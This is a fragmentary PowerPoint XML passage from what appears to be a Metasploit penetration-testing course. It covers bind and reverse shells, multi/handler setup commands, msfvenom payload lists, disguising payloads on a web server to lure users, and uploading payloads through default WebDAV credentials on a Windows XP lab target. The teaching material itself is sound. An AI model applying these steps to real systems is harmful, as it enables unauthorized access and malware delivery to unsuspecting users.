              <a:t>stages provide advanced features with no size limits such as Meterpreter and VNC Injection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42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Compatible Payloads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10" y="1196752"/>
            <a:ext cx="8687978" cy="261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49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Test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340768"/>
            <a:ext cx="7459663" cy="305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755576" y="3861048"/>
            <a:ext cx="1800200" cy="6480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1520" y="4509120"/>
            <a:ext cx="871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Meterpreter is short for meta-interpreter, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>Metasploit’s</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> unique payload.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589240"/>
            <a:ext cx="9144000" cy="10772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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>default options is that </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> uses the port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>4444</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>. In our lab there is nothing wrong with this. It will work just fine. However, on real engagements, if your client is using even primitive intrusion-prevention software, it may take note of traffic on port 4444 and say, “Hey, you are </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>, go away!” and drop your connection.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="301614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Shells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Meterpreter or otherwise, shells fall into two </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>categories</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: bind and reverse. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="1026" name="Picture 2" descr="MSFRB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564904"/>
            <a:ext cx="4886325" cy="335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0941" y="2564904"/>
            <a:ext cx="35575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bind shell </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>instructs the target machine to open a command shell and listen on a local port. The attack machine then connects to the target machine on the listening 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reverse shell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, on the other hand, actively pushes a connection back to the attack machine rather than waiting for an incoming connection.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947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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> handlers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Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> handlers are best to use for Meterpreter or most reverse shells</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>A handler is often an abstract object with a well-defined interface, representing a shared (system) resource that can’t be exposed directly to users because of security or complexity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/>
              <a:t>A handler is usually an object of very small size (4 bytes to 16 bytes).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4005064"/>
            <a:ext cx="2966774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use exploit/multi/handler</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set PAYLOAD &lt;Payload name&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LHOST &lt;LHOST value&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set LPORT &lt;LPORT value&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>exploi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289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a Payload Manually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" y="1772816"/>
            <a:ext cx="7478713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520" y="3201985"/>
            <a:ext cx="8712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Because this is a reverse shell, we need to tell the target where to send the shell; specifically, we need to give it the IP address of the attack machine and the port we will listen on.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2785166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a Payload Manually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340768"/>
            <a:ext cx="6848722" cy="5301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-9812" y="2852936"/>
            <a:ext cx="2205547" cy="23083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LHOST</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>our local host on the Kali machine, the IP address we want our target machine to connect back to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>e.g.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>set LHOST 192.168.20.9</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3629137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Msfvenom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2011, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> was added to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>Metasploit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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>could be used </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>create standalone </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>encoded </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> payloads in a variety of output formats, such as Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>executables </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>and ASP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>pages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Instead of relying on a missing patch or other </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>security issue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, we are hoping to exploit the one security issue that may never be fully </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>patched</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: the users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> allows you to build standalone payloads </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>to run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>on a target system in an attempt to exploit the user whether through a social-engineering </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>attack or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>by uploading a payload to a vulnerable server</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="4284226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Msfvenom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Choosing a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Payload</a:t>
            </a:r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916832"/>
            <a:ext cx="535305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9512" y="2852936"/>
            <a:ext cx="8496944" cy="37856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 smtClean="0"/>
              <a:t>root@kali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" smtClean="0"/>
              <a:t>: ~# </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0"/>
              <a:t>-l payloads</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" b="1" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Name                        </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Description</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>    ----                        -----------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aix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>ppc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>shell_bind_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>      Listen for a connection </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>and spawn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>a command shell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aix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>ppc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>shell_find_port</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>     Spawn a shell on an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>established </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>connection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aix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>ppc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>shell_interact</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>      Simply </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>execve</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> /bin/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>for    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>inetd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> programs)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aix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>ppc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>shell_reverse_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>   Connect back to attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>an spawn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>a command shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>    android/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/revers  Run a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1" smtClean="0"/>
              <a:t>e_http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>Android. Tunnel </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>communication </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>over HTTP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>    android/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/revers  Run a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>in  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>e_https</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Android</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>. Tunnel </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>communication </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>over HTTPS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>    android/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>/revers  Run a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> server </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>in  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>e_tcp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>Android</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>. Connect back </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>stager</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>    android/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter_revers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>  Connect back to attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1" smtClean="0"/>
              <a:t>e_http</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t> d </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>spawn a Meterpreter shell</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>    android/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>meterpreter_revers</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>  Connect back to attacker </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t>an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1" smtClean="0"/>
              <a:t>e_httpsd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" smtClean="0"/>
              <a:t> spawn a Meterpreter shell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97123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Msfvenom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Choosing an Output </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Format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FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-f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… </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Combination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0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>payload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format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LHOST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LPORT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700808"/>
            <a:ext cx="7392987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6" y="4509120"/>
            <a:ext cx="9117013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7718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Msfvenom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Serving </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Payloads</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>One good way to serve up payloads is to host them on a web server, disguise </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>them </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>as something useful, and lure users into downloading </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>them</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>E.g. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Copy to home folder: /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
              <a:t>var</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>/www/html</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>On the Windows </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>XP target and open Internet </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Explorer Browse </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>to http://192.168.20.9/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>chapter4example.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> and download the file</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3042483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Msfvenom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Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>the Multi/Handler </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" smtClean="0"/>
              <a:t>Module</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>This module allows us to set up </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>standalone </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>handlers to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>catch our Meterpreter </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>connection when </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>our malicious executable is run from the Windows XP target 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140968"/>
            <a:ext cx="5234656" cy="3140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836" y="3824038"/>
            <a:ext cx="4135164" cy="162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4355976" y="4293096"/>
            <a:ext cx="360040" cy="345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58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Exploiting </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>WebDAV </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Default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XAMPP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>installed </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>on </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Windows XP target </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>employs default login credentials for the WebDAV folder used </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>to upload </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>files to the web server. </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>This </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>issue allows us to upload our own </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>pages to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>the server with </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Cadaver</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>, a command line client for WebDAV, which </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" smtClean="0"/>
              <a:t>we used </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>to verify this vulnerability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0" y="3692103"/>
            <a:ext cx="4721225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365104"/>
            <a:ext cx="6764337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5505450"/>
            <a:ext cx="6716713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044" y="3620486"/>
            <a:ext cx="3703738" cy="1188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Bent-Up Arrow 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="85782" y="4440318"/>
            <a:ext cx="360040" cy="40348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ent-Up Arrow 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="5400000">
            <a:off x="1209346" y="5799963"/>
            <a:ext cx="360040" cy="40348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 Arrow 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7812360" y="4869160"/>
            <a:ext cx="216024" cy="50405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32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WebDAV Default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Running a Script on the Target Web </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Server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433" y="1916832"/>
            <a:ext cx="6773863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9646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WebDAV Default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Uploading a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Payload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797" y="1635015"/>
            <a:ext cx="6289005" cy="4802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520" y="2708920"/>
            <a:ext cx="2232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download and execute a file on</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>the system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), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>create a shell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), </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>or even use Meterpreter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2225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WebDAV Default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18" y="1191258"/>
            <a:ext cx="8784976" cy="5112568"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" smtClean="0"/>
              <a:t>Generate a payload by </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1" smtClean="0"/>
